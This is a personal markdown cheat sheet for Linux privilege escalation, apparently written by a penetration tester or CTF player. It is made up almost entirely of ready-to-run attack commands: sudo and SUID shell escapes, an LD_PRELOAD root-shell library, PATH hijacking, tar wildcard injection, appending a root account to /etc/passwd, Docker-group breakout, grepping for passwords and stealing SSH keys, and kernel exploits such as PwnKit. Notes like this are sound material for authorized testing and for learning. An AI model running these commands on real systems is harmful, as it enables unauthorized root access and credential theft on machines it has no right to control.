# Moraa — Linux Privilege Escalation

> Owner weak area. Checklist top-down, commands first. Confirm each finding before chasing it.

---

## 0. Orient (first 60 seconds)

```bash
id; whoami; hostname
uname -a; cat /etc/os-release         # kernel + distro for exploit matching
sudo -l                               # ALWAYS run first — biggest single win
ip a; cat /etc/hosts                  # second NIC = pivot candidate
cat /etc/passwd | grep -v nologin     # real users / shells
```

## 1. Automated enum (run one, read criticals)

```bash
./linpeas.sh | tee linpeas.txt        # read the 99%/RED items
./lse.sh -l1                          # linux-smart-enumeration
# pspy to watch cron/root processes without root:
./pspy64
```

---

## 2. High-yield wins (in order)

### A. sudo -l (do this first, every time)

```bash
sudo -l
```

- **(ALL) NOPASSWD: ALL** → `sudo su`.
- A specific binary → check **GTFOBins**: `sudo <binary>` escape. Common ones:
  ```bash
  sudo vim -c ':!/bin/sh'
  sudo find . -exec /bin/sh \; -quit
  sudo less /etc/profile        # then !sh
  sudo awk 'BEGIN{system("/bin/sh")}'
  sudo env /bin/sh
  sudo python3 -c 'import os;os.system("/bin/sh")'
  sudo nmap --interactive       # legacy
  ```
- **LD_PRELOAD / LD_LIBRARY_PATH** in `env_keep` → load malicious .so:
  ```bash
  # gcc -fPIC -shared -o /tmp/x.so x.c  (x.c: void _init(){setuid(0);system("/bin/sh");})
  sudo LD_PRELOAD=/tmp/x.so <allowed_binary>
  ```
- Sudo version old? `sudo --version` → CVE-2021-3156 (Baron Samedit), CVE-2019-14287
  (`sudo -u#-1`), CVE-2023-22809 (`sudoedit` EDITOR).

### B. SUID / SGID binaries

```bash
find / -perm -4000 -type f 2>/dev/null          # SUID
find / -perm -2000 -type f 2>/dev/null          # SGID
```

Check each non-standard one against **GTFOBins** (suid section). Classic wins:
`/bin/bash` (`-p`), `cp`, `find`, `nmap`, `vim`, `nano`, `python`, `env`, `tar`, `zip`,
`base64`, `systemctl`, custom company binaries (reverse/strings them).

```bash
./suid_bash -p                                  # if bash is SUID
# custom SUID calling a relative binary → PATH hijack (see D)
strings /path/suidbin | grep -iE 'system|exec|/bin|cp|chmod'
```

### C. Capabilities

```bash
getcap -r / 2>/dev/null
# cap_setuid on python/perl → root:
/usr/bin/python3 -c 'import os;os.setuid(0);os.system("/bin/sh")'
# cap_dac_read_search → read any file (e.g. shadow)
```

### D. PATH hijacking (cron/SUID calling a binary by name)

```bash
# If a root cron or SUID binary calls e.g. `service`/`backup` without absolute path:
echo '/bin/bash -p' > /tmp/service && chmod +x /tmp/service
export PATH=/tmp:$PATH
# trigger it
```

### E. Cron jobs

```bash
cat /etc/crontab; ls -la /etc/cron.*; crontab -l
# writable script run by root cron, or wildcard injection (tar/rsync *), or PATH hijack
# wildcard (tar): create files named --checkpoint=1 --checkpoint-action=exec=sh shell.sh
```

### F. Writable sensitive files

```bash
ls -la /etc/passwd /etc/shadow /etc/sudoers
# /etc/passwd writable → add root user:
openssl passwd -1 -salt x pass        # → hash
echo 'r00t:<hash>:0:0::/root:/bin/bash' >> /etc/passwd && su r00t
# writable /etc/sudoers.d/* or shadow → game over
find / -writable -type f 2>/dev/null | grep -vE '^/proc|^/sys'
```

---

## 3. Credential & data hunting

```bash
grep -rinE 'password|passwd|secret|api[_-]?key|token' /var/www /opt /home /etc 2>/dev/null
find / -name "*.bak" -o -name "*.kdbx" -o -name "id_rsa" 2>/dev/null
cat ~/.bash_history ~/.mysql_history 2>/dev/null
cat /var/www/**/{config.php,wp-config.php,.env,settings.py} 2>/dev/null
ls -la ~/.ssh /home/*/.ssh 2>/dev/null          # steal id_rsa → reuse
# DB creds → often reused for system/AD accounts
```

SSH key reuse + password reuse is the most common lateral/escalation path — try found creds
with `su <user>` and against other hosts.

---

## 4. Containers / less common

- **Docker group** membership → root: `docker run -v /:/mnt -it alpine chroot /mnt sh`.
- Inside a container: check `/.dockerenv`, `capsh --print`, `/run/secrets`, mounted host paths,
  `/var/run/docker.sock` writable.
- **NFS no_root_squash** (`cat /etc/exports`) → mount on attacker, drop SUID root binary.
- **Writable /etc/ld.so.conf.d/**, **systemd timer/service** you can edit.

## 5. Kernel exploit (last resort)

```bash
uname -r                                # match with:
./linux-exploit-suggester.sh
# Famous: DirtyPipe (5.8-5.16.11), DirtyCow (<4.8.3), PwnKit/pkexec (CVE-2021-4034 — almost universal)
# PwnKit is the reliable go-to on older boxes:
./PwnKit            # or compile cve-2021-4034
```

---

## Quick decision tree

```
sudo -l has anything? ── yes ──► GTFOBins escape / LD_PRELOAD ──► root
      │ no
Interesting SUID/cap?  ── yes ──► GTFOBins suid / setuid(0) ──► root
      │ no
Root cron/SUID calls relative bin or writable script? ── yes ──► PATH/wildcard/edit ──► root
      │ no
/etc/passwd|shadow|sudoers writable? ── yes ──► add root / edit ──► root
      │ no
Creds/keys on disk reused elsewhere? ── yes ──► su / ssh ──► escalate or lateral
      │ no
PwnKit / linux-exploit-suggester ──► last resort
```

Confirm with `id`, then record the path + evidence in `findings/`.
